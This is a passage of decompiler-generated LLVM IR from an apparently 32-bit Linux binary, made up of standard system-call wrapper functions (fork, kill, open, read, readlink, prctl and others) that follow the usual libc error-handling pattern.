  %v5_80520d4 = and i32 %v4_80520d4, -256
  %v6_80520d4 = or i32 %v3_80520d4, %v5_80520d4
  store i32 %v6_80520d4, i32* %eax.global-to-local, align 4
  %v1_80520d6 = add i32 %v0_80520d6, -1
  store i32 %v1_80520d6, i32* %ecx.global-to-local, align 4
  %v3_80520d7 = inttoptr i32 %v2_80520d7 to i8*
  store i8 %v2_80520d4, i8* %v3_80520d7, align 1
  %v0_80520d9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80520d9 = add i32 %v0_80520d9, 1
  store i32 %v1_80520d9, i32* %edx.global-to-local, align 4
  %v0_80520da = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520da = add i32 %v0_80520da, 1
  store i32 %v1_80520da, i32* %ebx.global-to-local, align 4
  %v0_80520db = load i32, i32* %ecx.global-to-local, align 4
  %v10_80520db = icmp eq i32 %v0_80520db, -1
  %v1_80520de = icmp eq i1 %v10_80520db, false
  br i1 %v1_80520de, label %dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge, label %dec_label_pc_80520e0.loopexit

dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge: ; preds = %dec_label_pc_80520d4
  %v4_80520d4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80520d4

dec_label_pc_80520e0.loopexit:                    ; preds = %dec_label_pc_80520d4
  br label %dec_label_pc_80520e0

dec_label_pc_80520e0:                             ; preds = %dec_label_pc_80520e0.loopexit, %dec_label_pc_80520cb, %dec_label_pc_8052060
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_80520f0:                             ; preds = %dec_label_pc_8052077
  store i8 48, i8* %tmp25, align 1
  %v2_80520f3 = add i32 %arg3, 1
  %v3_80520f3 = inttoptr i32 %v2_80520f3 to i8*
  store i8 0, i8* %v3_80520f3, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052106:                             ; preds = %dec_label_pc_80520b4
  %v0_8052106 = load i32, i32* @esp, align 4
  %v2_8052106 = add i32 %v0_80520ab, 13
  %v3_8052106 = add i32 %v2_8052106, %v0_8052106
  %v4_8052106 = inttoptr i32 %v3_8052106 to i8*
  store i8 45, i8* %v4_8052106, align 1
  %v1_80520b9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520b9

dec_label_pc_805210d:                             ; preds = %dec_label_pc_805207b
  %v1_805210f = icmp eq i1 %v3_8052077, false
  br i1 %v1_805210f, label %dec_label_pc_8052089, label %dec_label_pc_8052115

dec_label_pc_8052115:                             ; preds = %dec_label_pc_805210d
  %v1_8052117 = sub i32 0, %v4_805206b
  br label %dec_label_pc_805208d

dec_label_pc_8052125:                             ; preds = %dec_label_pc_80520b9
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_80520b9, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80520d4

; uselistorder directives
  uselistorder i32 %v1_80520da, { 1, 0 }
  uselistorder i32 %v1_80520d9, { 1, 0 }
  uselistorder i32 %v1_80520c4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80520b9, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div20, { 1, 2, 0 }
  uselistorder i32 %v1_80520ab, { 1, 0 }
  uselistorder i32 %v4_805206b, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520d4, { 0, 2, 1 }
}

define i32 @function_805212d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805212d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805212d = load i32, i32* @edi, align 4
  %v0_805212e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052142 = add i32 %arg2, -12
  %v6_805214c = icmp ugt i32 %v1_8052142, 2
  br i1 %v6_805214c, label %dec_label_pc_805215c, label %dec_label_pc_805214e

dec_label_pc_805214e:                             ; preds = %dec_label_pc_805212d
  %v4_8052152 = call i32 @function_8052184(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8052142)
  br label %dec_label_pc_805217e

dec_label_pc_805215c:                             ; preds = %dec_label_pc_805212d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052164 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052164, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8052164, -4095
  br i1 %tmp17, label %dec_label_pc_805217c, label %dec_label_pc_8052170

dec_label_pc_8052170:                             ; preds = %dec_label_pc_805215c
  %v1_8052170 = call i32 @function_8052729(i32 %v0_805212e)
  %v0_8052175 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052175 = sub i32 0, %v0_8052175
  %v2_8052177 = inttoptr i32 %v1_8052170 to i32*
  store i32 %v1_8052175, i32* %v2_8052177, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805217c

dec_label_pc_805217c:                             ; preds = %dec_label_pc_805215c, %dec_label_pc_8052170
  %v0_805217c = phi i32 [ %v2_8052164, %dec_label_pc_805215c ], [ -1, %dec_label_pc_8052170 ]
  br label %dec_label_pc_805217e

dec_label_pc_805217e:                             ; preds = %dec_label_pc_805214e, %dec_label_pc_805217c
  %v0_8052183 = phi i32 [ %v4_8052152, %dec_label_pc_805214e ], [ %v0_805217c, %dec_label_pc_805217c ]
  store i32 %v0_805212e, i32* @ebx, align 4
  store i32 %v0_805212d, i32* @edi, align 4
  ret i32 %v0_8052183

; uselistorder directives
  uselistorder i32 %v2_8052164, { 1, 0, 2 }
  uselistorder i32 %v0_805212e, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805217e, { 1, 0 }
  uselistorder label %dec_label_pc_805217c, { 1, 0 }
}

define i32 @function_8052184(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052184:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052184 = load i32, i32* @edi, align 4
  store i32 %v0_8052184, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805219c = load i32, i32* @ebx, align 4
  %v1_80521a4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_80521a4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_80521a4, -4095
  br i1 %tmp12, label %dec_label_pc_80521bc, label %dec_label_pc_80521b0

dec_label_pc_80521b0:                             ; preds = %dec_label_pc_8052184
  %v1_80521b0 = call i32 @function_8052729(i32 %v0_805219c)
  %v0_80521b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80521b5 = sub i32 0, %v0_80521b5
  %v2_80521b7 = inttoptr i32 %v1_80521b0 to i32*
  store i32 %v1_80521b5, i32* %v2_80521b7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80521c1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521bc

dec_label_pc_80521bc:                             ; preds = %dec_label_pc_8052184, %dec_label_pc_80521b0
  %v2_80521c1 = phi i32 [ %v0_8052184, %dec_label_pc_8052184 ], [ %v2_80521c1.pre, %dec_label_pc_80521b0 ]
  %v0_80521bc = phi i32 [ %v1_80521a4, %dec_label_pc_8052184 ], [ -1, %dec_label_pc_80521b0 ]
  store i32 %v2_80521c1, i32* %edi.global-to-local, align 4
  ret i32 %v0_80521bc

; uselistorder directives
  uselistorder i32 %v1_80521a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521bc, { 1, 0 }
}

define i32 @function_80521c3(i8* %arg1) local_unnamed_addr {
dec_label_pc_80521c3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521c3 = load i32, i32* @edi, align 4
  store i32 %v0_80521c3, i32* %stack_var_-4, align 4
  %v4_80521c7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80521c7, i32* %edi.global-to-local, align 4
  %v0_80521cb = load i32, i32* @ebx, align 4
  %v3_80521d3 = call i32 @chdir(i8* %arg1)
  store i32 %v3_80521d3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80521d3, -4095
  br i1 %tmp9, label %dec_label_pc_80521eb, label %dec_label_pc_80521df

dec_label_pc_80521df:                             ; preds = %dec_label_pc_80521c3
  %v1_80521df = call i32 @function_8052729(i32 %v0_80521cb)
  %v0_80521e4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80521e4 = sub i32 0, %v0_80521e4
  %v2_80521e6 = inttoptr i32 %v1_80521df to i32*
  store i32 %v1_80521e4, i32* %v2_80521e6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80521ef.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521eb

dec_label_pc_80521eb:                             ; preds = %dec_label_pc_80521c3, %dec_label_pc_80521df
  %v2_80521ef = phi i32 [ %v0_80521c3, %dec_label_pc_80521c3 ], [ %v2_80521ef.pre, %dec_label_pc_80521df ]
  %v0_80521eb = phi i32 [ %v3_80521d3, %dec_label_pc_80521c3 ], [ -1, %dec_label_pc_80521df ]
  store i32 %v2_80521ef, i32* %edi.global-to-local, align 4
  ret i32 %v0_80521eb

; uselistorder directives
  uselistorder i32 %v3_80521d3, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521eb, { 1, 0 }
}

define i32 @function_80521f1(i32 %arg1) local_unnamed_addr {
dec_label_pc_80521f1:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521f1 = load i32, i32* @edi, align 4
  store i32 %v0_80521f1, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80521f9 = load i32, i32* @ebx, align 4
  %v1_8052201 = call i32 @close(i32 %arg1)
  store i32 %v0_80521f9, i32* @ebx, align 4
  store i32 %v1_8052201, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8052201, -4095
  br i1 %tmp9, label %dec_label_pc_8052219, label %dec_label_pc_805220d

dec_label_pc_805220d:                             ; preds = %dec_label_pc_80521f1
  %v1_805220d = call i32 @function_8052729(i32 %v0_80521f9)
  %v0_8052212 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052212 = sub i32 0, %v0_8052212
  %v2_8052214 = inttoptr i32 %v1_805220d to i32*
  store i32 %v1_8052212, i32* %v2_8052214, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805221d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052219

dec_label_pc_8052219:                             ; preds = %dec_label_pc_80521f1, %dec_label_pc_805220d
  %v2_805221d = phi i32 [ %v0_80521f1, %dec_label_pc_80521f1 ], [ %v2_805221d.pre, %dec_label_pc_805220d ]
  %v0_8052219 = phi i32 [ %v1_8052201, %dec_label_pc_80521f1 ], [ -1, %dec_label_pc_805220d ]
  %v2_805221b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805221b, i32* @edx, align 4
  store i32 %v2_805221d, i32* @edi, align 4
  ret i32 %v0_8052219

; uselistorder directives
  uselistorder i32 %v1_8052201, { 1, 0, 2 }
  uselistorder i32 %v0_80521f9, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052219, { 1, 0 }
}

define i32 @function_805221f() local_unnamed_addr {
dec_label_pc_805221f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805221f = load i32, i32* @ebx, align 4
  store i32 %v0_805221f, i32* %stack_var_-4, align 4
  %v1_8052228 = call i32 @fork(i32 %v0_805221f)
  store i32 %v1_8052228, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052228, -4095
  br i1 %tmp7, label %dec_label_pc_805223f, label %dec_label_pc_8052233

dec_label_pc_8052233:                             ; preds = %dec_label_pc_805221f
  %v1_8052233 = call i32 @function_8052729(i32 %v0_805221f)
  %v0_8052238 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052238 = sub i32 0, %v0_8052238
  %v2_805223a = inttoptr i32 %v1_8052233 to i32*
  store i32 %v1_8052238, i32* %v2_805223a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052243.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805223f

dec_label_pc_805223f:                             ; preds = %dec_label_pc_805221f, %dec_label_pc_8052233
  %v2_8052243 = phi i32 [ %v0_805221f, %dec_label_pc_805221f ], [ %v2_8052243.pre, %dec_label_pc_8052233 ]
  %v0_805223f = phi i32 [ %v1_8052228, %dec_label_pc_805221f ], [ -1, %dec_label_pc_8052233 ]
  store i32 %v2_8052243, i32* @ebx, align 4
  ret i32 %v0_805223f

; uselistorder directives
  uselistorder i32 %v1_8052228, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805223f, { 1, 0 }
}

define i32 @function_8052245() local_unnamed_addr {
dec_label_pc_8052245:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052245 = load i32, i32* @ebx, align 4
  store i32 %v0_8052245, i32* %stack_var_-4, align 4
  %v1_805224e = call i32 @getpid(i32 %v0_8052245)
  store i32 %v1_805224e, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805224e, -4095
  br i1 %tmp7, label %dec_label_pc_8052265, label %dec_label_pc_8052259

dec_label_pc_8052259:                             ; preds = %dec_label_pc_8052245
  %v1_8052259 = call i32 @function_8052729(i32 %v0_8052245)
  %v0_805225e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805225e = sub i32 0, %v0_805225e
  %v2_8052260 = inttoptr i32 %v1_8052259 to i32*
  store i32 %v1_805225e, i32* %v2_8052260, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052269.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052265

dec_label_pc_8052265:                             ; preds = %dec_label_pc_8052245, %dec_label_pc_8052259
  %v2_8052269 = phi i32 [ %v0_8052245, %dec_label_pc_8052245 ], [ %v2_8052269.pre, %dec_label_pc_8052259 ]
  %v0_8052265 = phi i32 [ %v1_805224e, %dec_label_pc_8052245 ], [ -1, %dec_label_pc_8052259 ]
  %v2_8052267 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052267, i32* @edx, align 4
  store i32 %v2_8052269, i32* @ebx, align 4
  ret i32 %v0_8052265

; uselistorder directives
  uselistorder i32 %v1_805224e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052265, { 1, 0 }
}

define i32 @function_805226b() local_unnamed_addr {
dec_label_pc_805226b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805226b = load i32, i32* @ebx, align 4
  store i32 %v0_805226b, i32* %stack_var_-4, align 4
  %v1_8052274 = call i32 @getppid(i32 %v0_805226b)
  store i32 %v1_8052274, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052274, -4095
  br i1 %tmp7, label %dec_label_pc_805228b, label %dec_label_pc_805227f

dec_label_pc_805227f:                             ; preds = %dec_label_pc_805226b
  %v1_805227f = call i32 @function_8052729(i32 %v0_805226b)
  %v0_8052284 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052284 = sub i32 0, %v0_8052284
  %v2_8052286 = inttoptr i32 %v1_805227f to i32*
  store i32 %v1_8052284, i32* %v2_8052286, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805228f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805228b

dec_label_pc_805228b:                             ; preds = %dec_label_pc_805226b, %dec_label_pc_805227f
  %v2_805228f = phi i32 [ %v0_805226b, %dec_label_pc_805226b ], [ %v2_805228f.pre, %dec_label_pc_805227f ]
  %v0_805228b = phi i32 [ %v1_8052274, %dec_label_pc_805226b ], [ -1, %dec_label_pc_805227f ]
  %v2_805228d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805228d, i32* @edx, align 4
  store i32 %v2_805228f, i32* @ebx, align 4
  ret i32 %v0_805228b

; uselistorder directives
  uselistorder i32 %v1_8052274, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805228b, { 1, 0 }
}

define i32 @function_8052291(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052291:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052291 = load i32, i32* @edi, align 4
  store i32 %v0_8052291, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80522a9 = load i32, i32* @ebx, align 4
  %v2_80522b1 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_80522b1, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_80522b1, -4095
  br i1 %tmp12, label %dec_label_pc_80522c9, label %dec_label_pc_80522bd

dec_label_pc_80522bd:                             ; preds = %dec_label_pc_8052291
  %v1_80522bd = call i32 @function_8052729(i32 %v0_80522a9)
  %v0_80522c2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80522c2 = sub i32 0, %v0_80522c2
  %v2_80522c4 = inttoptr i32 %v1_80522bd to i32*
  store i32 %v1_80522c2, i32* %v2_80522c4, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80522ce.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522c9

dec_label_pc_80522c9:                             ; preds = %dec_label_pc_8052291, %dec_label_pc_80522bd
  %v2_80522ce = phi i32 [ %v0_8052291, %dec_label_pc_8052291 ], [ %v2_80522ce.pre, %dec_label_pc_80522bd ]
  %v0_80522c9 = phi i32 [ %v2_80522b1, %dec_label_pc_8052291 ], [ -1, %dec_label_pc_80522bd ]
  store i32 %v2_80522ce, i32* %edi.global-to-local, align 4
  ret i32 %v0_80522c9

; uselistorder directives
  uselistorder i32 %v2_80522b1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80522c9, { 1, 0 }
}

define i32 @function_80522d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80522d0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522d0 = load i32, i32* @ebx, align 4
  store i32 %v0_80522d0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80522e3 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_80522e3, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80522e3, -4095
  br i1 %tmp9, label %dec_label_pc_80522fc, label %dec_label_pc_80522f0

dec_label_pc_80522f0:                             ; preds = %dec_label_pc_80522d0
  %v1_80522f0 = call i32 @function_8052729(i32 %v0_80522d0)
  %v0_80522f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522f5 = sub i32 0, %v0_80522f5
  %v2_80522f7 = inttoptr i32 %v1_80522f0 to i32*
  store i32 %v1_80522f5, i32* %v2_80522f7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052300.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522fc

dec_label_pc_80522fc:                             ; preds = %dec_label_pc_80522d0, %dec_label_pc_80522f0
  %v2_8052300 = phi i32 [ %v0_80522d0, %dec_label_pc_80522d0 ], [ %v2_8052300.pre, %dec_label_pc_80522f0 ]
  %v0_80522fc = phi i32 [ %v2_80522e3, %dec_label_pc_80522d0 ], [ -1, %dec_label_pc_80522f0 ]
  %v2_80522fe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522fe, i32* @edx, align 4
  store i32 %v2_8052300, i32* @ebx, align 4
  ret i32 %v0_80522fc

; uselistorder directives
  uselistorder i32 %v2_80522e3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80522fc, { 1, 0 }
}

define i32 @function_8052302(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052302:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8052303 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8052309 = sdiv i32 %sext, 16777216
  store i32 %v4_8052309, i32* @ecx, align 4
  %v4_805230d = ptrtoint i8* %arg1 to i32
  %v3_8052311 = and i32 %arg2, 64
  %v4_8052311 = icmp eq i32 %v3_8052311, 0
  br i1 %v4_8052311, label %dec_label_pc_8052322, label %dec_label_pc_8052316

dec_label_pc_8052316:                             ; preds = %dec_label_pc_8052302
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052322

dec_label_pc_8052322:                             ; preds = %dec_label_pc_8052302, %dec_label_pc_8052316
  %v0_8052322 = phi i32 [ 0, %dec_label_pc_8052302 ], [ %phitmp, %dec_label_pc_8052316 ]
  store i32 %v0_8052322, i32* @edx, align 4
  store i32 %v4_805230d, i32* %ebx.global-to-local, align 4
  %v5_805232d = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8052309)
  store i32 %v5_805232d, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805232d, -4095
  br i1 %tmp15, label %dec_label_pc_8052345, label %dec_label_pc_8052339

dec_label_pc_8052339:                             ; preds = %dec_label_pc_8052322
  %v1_8052339 = call i32 @function_8052729(i32 %v0_8052303)
  %v0_805233e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805233e = sub i32 0, %v0_805233e
  %v2_8052340 = inttoptr i32 %v1_8052339 to i32*
  store i32 %v1_805233e, i32* %v2_8052340, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052345

dec_label_pc_8052345:                             ; preds = %dec_label_pc_8052322, %dec_label_pc_8052339
  %v0_8052345 = phi i32 [ %v5_805232d, %dec_label_pc_8052322 ], [ -1, %dec_label_pc_8052339 ]
  store i32 %v0_8052303, i32* @ebx, align 4
  ret i32 %v0_8052345

; uselistorder directives
  uselistorder i32 %v5_805232d, { 1, 0, 2 }
  uselistorder i32 %v4_8052309, { 1, 0 }
  uselistorder i32 %v0_8052303, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052345, { 1, 0 }
  uselistorder label %dec_label_pc_8052322, { 1, 0 }
}

define i32 @function_805234d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805234d:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805234e = load i32, i32* @esi, align 4
  store i32 %v0_805234e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052366 = load i32, i32* @ebx, align 4
  %v5_805236e = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_805236e, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_805236e, -4095
  br i1 %tmp12, label %dec_label_pc_8052386, label %dec_label_pc_805237a

dec_label_pc_805237a:                             ; preds = %dec_label_pc_805234d
  %v1_805237a = call i32 @function_8052729(i32 %v0_8052366)
  %v0_805237f = load i32, i32* %esi.global-to-local, align 4
  %v1_805237f = sub i32 0, %v0_805237f
  %v2_8052381 = inttoptr i32 %v1_805237a to i32*
  store i32 %v1_805237f, i32* %v2_8052381, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052389.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052386

dec_label_pc_8052386:                             ; preds = %dec_label_pc_805234d, %dec_label_pc_805237a
  %v2_8052389 = phi i32 [ %v0_805234e, %dec_label_pc_805234d ], [ %v2_8052389.pre, %dec_label_pc_805237a ]
  %v0_8052386 = phi i32 [ %v5_805236e, %dec_label_pc_805234d ], [ -1, %dec_label_pc_805237a ]
  store i32 %v2_8052389, i32* %esi.global-to-local, align 4
  ret i32 %v0_8052386

; uselistorder directives
  uselistorder i32 %v5_805236e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052386, { 1, 0 }
}

define i32 @function_805238c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805238c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805238c = load i32, i32* @edi, align 4
  store i32 %v0_805238c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805239c = load i32, i32* @ebx, align 4
  %v4_80523a4 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805239c, i32* @ebx, align 4
  store i32 %v4_80523a4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_80523a4, -4095
  br i1 %tmp12, label %dec_label_pc_80523bc, label %dec_label_pc_80523b0

dec_label_pc_80523b0:                             ; preds = %dec_label_pc_805238c
  %v1_80523b0 = call i32 @function_8052729(i32 %v0_805239c)
  %v0_80523b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80523b5 = sub i32 0, %v0_80523b5
  %v2_80523b7 = inttoptr i32 %v1_80523b0 to i32*
  store i32 %v1_80523b5, i32* %v2_80523b7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80523c0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523bc

dec_label_pc_80523bc:                             ; preds = %dec_label_pc_805238c, %dec_label_pc_80523b0
  %v2_80523c0 = phi i32 [ %v0_805238c, %dec_label_pc_805238c ], [ %v2_80523c0.pre, %dec_label_pc_80523b0 ]
  %v0_80523bc = phi i32 [ %v4_80523a4, %dec_label_pc_805238c ], [ -1, %dec_label_pc_80523b0 ]
  store i32 %v2_80523c0, i32* @edi, align 4
  ret i32 %v0_80523bc

; uselistorder directives
  uselistorder i32 %v4_80523a4, { 1, 0, 2 }
  uselistorder i32 %v0_805239c, { 1, 0 }
  uselistorder label %dec_label_pc_80523bc, { 1, 0 }
}

define i32 @function_80523c2(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80523c2:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80523c2 = load i32, i32* @edi, align 4
  store i32 %v0_80523c2, i32* %stack_var_-4, align 4
  %v4_80523c6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80523c6, i32* %edi.global-to-local, align 4
  %v0_80523d2 = load i32, i32* @ebx, align 4
  %v7_80523da = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v0_80523d2, i32* @ebx, align 4
  store i32 %v7_80523da, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_80523da, -4095
  br i1 %tmp13, label %dec_label_pc_80523f2, label %dec_label_pc_80523e6

dec_label_pc_80523e6:                             ; preds = %dec_label_pc_80523c2
  %v1_80523e6 = call i32 @function_8052729(i32 %v0_80523d2)
  %v0_80523eb = load i32, i32* %edi.global-to-local, align 4
  %v1_80523eb = sub i32 0, %v0_80523eb
  %v2_80523ed = inttoptr i32 %v1_80523e6 to i32*
  store i32 %v1_80523eb, i32* %v2_80523ed, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80523f6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523f2

dec_label_pc_80523f2:                             ; preds = %dec_label_pc_80523c2, %dec_label_pc_80523e6
  %v2_80523f6 = phi i32 [ %v0_80523c2, %dec_label_pc_80523c2 ], [ %v2_80523f6.pre, %dec_label_pc_80523e6 ]
  %v0_80523f2 = phi i32 [ %v7_80523da, %dec_label_pc_80523c2 ], [ -1, %dec_label_pc_80523e6 ]
  %v2_80523f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80523f4, i32* @edx, align 4
  store i32 %v2_80523f6, i32* @edi, align 4
  ret i32 %v0_80523f2

; uselistorder directives
  uselistorder i32 %v7_80523da, { 1, 0, 2 }
  uselistorder i32 %v0_80523d2, { 1, 0 }
  uselistorder label %dec_label_pc_80523f2, { 1, 0 }
}

define i32 @function_80523f8() local_unnamed_addr {
dec_label_pc_80523f8:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80523f9 = load i32, i32* @esi, align 4
  store i32 %v0_80523f9, i32* %stack_var_-8, align 4
  %v0_8052411 = load i32, i32* @ebx, align 4
  %v1_8052419 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8052411, i32* @ebx, align 4
  store i32 %v1_8052419, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052419, -4095
